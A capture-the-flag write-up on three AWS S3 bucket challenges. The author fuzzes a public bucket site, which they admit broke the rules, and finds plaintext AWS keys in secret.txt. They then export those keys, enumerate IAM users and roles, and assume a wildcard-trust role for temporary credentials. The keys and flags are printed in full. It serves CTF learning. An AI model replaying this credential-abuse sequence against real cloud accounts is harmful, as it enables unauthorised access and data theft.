# Bucket 1, 2, 3 (beginner, medium, hard)

This is part 1/3 in the bucket-task series. You can start your bucket journey here.

I created this cool website! Can you find all the files on it?

Author: martcl

http://www.wack-ctf-bucket-43012.s3-website.eu-north-1.amazonaws.com/

# Writeup

I started by looking around but found nothing. Then I tried fuzzing which was against the rules, but they stated `their` servers. This was Amazon server I wrongly assumed.. Oh well, I'm sorry! 

> **Note**: The current method of doing it is: 
> `aws s3 ls s3://www.wack-ctf-bucket-43012 --no-sign-request`

I fuzzed html files and txt files and found `secret.txt`

```
__Credentials for aws s3 bruker__ 
AWS Access Key ID: AKIA3CFSQ45PLMQXIYWD
AWS Secret Access Key: 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
```

Using this creds I quickly added them to my enviroment

```bash
export AWS_ACCESS_KEY_ID=AKIA3CFSQ45PLMQXIYWD
export AWS_SECRET_ACCESS_KEY=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
```

Then used them to list buckets

```bash
└─$ aws s3 ls
2023-10-26 18:16:33 flag2-wack-ctf-bucket-43012
2023-10-26 18:16:33 flag3-wack-ctf-bucket-43012
2023-10-26 18:16:33 www.wack-ctf-bucket-43012
2023-10-22 22:42:40 www.wackattackntnumarkup
```

Using AWS s3 to copy all the buckets locally:

```bash
 aws s3 cp s3://flag2-wack-ctf-bucket-43012 ./s3/flag2-wack-ctf-bucket-43012 --recursive
 aws s3 cp s3://flag3-wack-ctf-bucket-43012 ./s3/flag3-wack-ctf-bucket-43012 --recursive
 aws s3 cp s3://www.wack-ctf-bucket-43012 ./s3/www.wack-ctf-bucket-43012 --recursive
 aws s3 cp s3://www.wackattackntnumarkup ./s3/www.wackattackntnumarkup --recursive
 ```

I start looking in [flag2-wack-ctf-bucket-43012](./s3/flag2-wack-ctf-bucket-43012) and find `flag.txt`. Trying this on `Bucket 1` fails but on `Bucket 2` it works. So one of 3 down.

Now in [www.wack-ctf-bucket-43012](./s3/www.wack-ctf-bucket-43012) I find a file named [kanskje_et_til_flagg_her.html](./s3/www.wack-ctf-bucket-43012/kanskje_et_til_flagg_her.html). And there is flag for `Bucket 1`. So two down.

Now the third must be in the `flag3-wack-ctf-bucket-43012` which I did not have access to download. But I can list the files in it:

```bash
└─$ aws s3 ls s3://flag3-wack-ctf-bucket-43012 
2023-10-26 18:16:34        172 flag.txt
```

And since he bragged about making stuff public maybe this one is too? 

https://flag3-wack-ctf-bucket-43012.s3.eu-north-1.amazonaws.com/flag.txt

No access! So I start going through the AWS cli to see if I have other information:

```bash
└─$ aws iam list-users --output text
USERS   arn:aws:iam::760583612254:user/43012                   2023-10-26T16:16:32+00:00       /       AIDA3CFSQ45PDXZE45IVC   43012
USERS   arn:aws:iam::760583612254:user/martin.clementz         2023-07-29T11:32:51+00:00       /       AIDA3CFSQ45PJJOKLLIQR   martin.clementz
USERS   arn:aws:iam::760583612254:user/serverless-xss          2023-10-15T14:47:24+00:00       /       AIDA3CFSQ45PI5MBA4CQA   serverless-xss
USERS   arn:aws:iam::760583612254:user/strapi-cms-deployment   2023-07-29T11:51:15+00:00       /       AIDA3CFSQ45PPODLWZGA6   strapi-cms-deployment

└─$ aws iam list-access-keys  --user 43012 --output text
ACCESSKEYMETADATA       AKIA3CFSQ45PLMQXIYWD    2023-10-26T16:16:33+00:00       Active  43012

└─$ aws iam list-user-policies --user-name 43012 --output text
POLICYNAMES     CTF_USER_ROLE

└─$ aws sts get-caller-identity --output text
760583612254    arn:aws:iam::760583612254:user/43012    AIDA3CFSQ45PDXZE45IVC

└─$ aws iam list-roles --output text

aws sts assume-role --role-arn arn:aws:iam::760583612254:role/flag3-role --external-id nullcon-external-id --role-session-name test

└─$ aws sts assume-role --role-arn arn:aws:iam::760583612254:role/flag3-role --external-id nullcon-external-id --role-session-name test

```

But when running `aws iam list-roles` I found a role named `flag3-role`. Then I see that I have access to assume that role for a short period of time.

```json
{
    "Path": "/",
    "RoleName": "flag3-role",
    "RoleId": "AROA3CFSQ45PKH3O6M5ZL",
    "Arn": "arn:aws:iam::760583612254:role/flag3-role",
    "CreateDate": "2023-10-26T16:16:33Z",
    "AssumeRolePolicyDocument": {
        "Version": "2012-10-17",
        "Statement": [
            {
                "Effect": "Allow",
                "Principal": {
                    "AWS": "*"
                },
                "Action": "sts:AssumeRole"
            }
        ]
    },
    "MaxSessionDuration": 3600
}
```

Assuming role gives a JSON element with a new access key and secret.

```bash 
aws sts assume-role --role-arn arn:aws:iam::760583612254:role/flag3-role --role-session-name test
```

Copying those and exporting to enviroment:

```
export AWS_ACCESS_KEY_ID=ASIA3CFSQ45PNXNRN44Y
export AWS_SECRET_ACCESS_KEY=EB2KWuyFMa1lpER+9LdcKLjOxJqFlS5bq6Si1Saq

```

I now have access to copy the 3rd flag:

```
aws s3 cp s3://flag3-wack-ctf-bucket-43012/flag.txt
```

Bingo!

# Flag

```
1: wack{this_bucket_should_not_have_important_creds}
2: wack{leaked_creds_can_get_you_access}
3: wack{i_assumed_u_was_good}
```
 
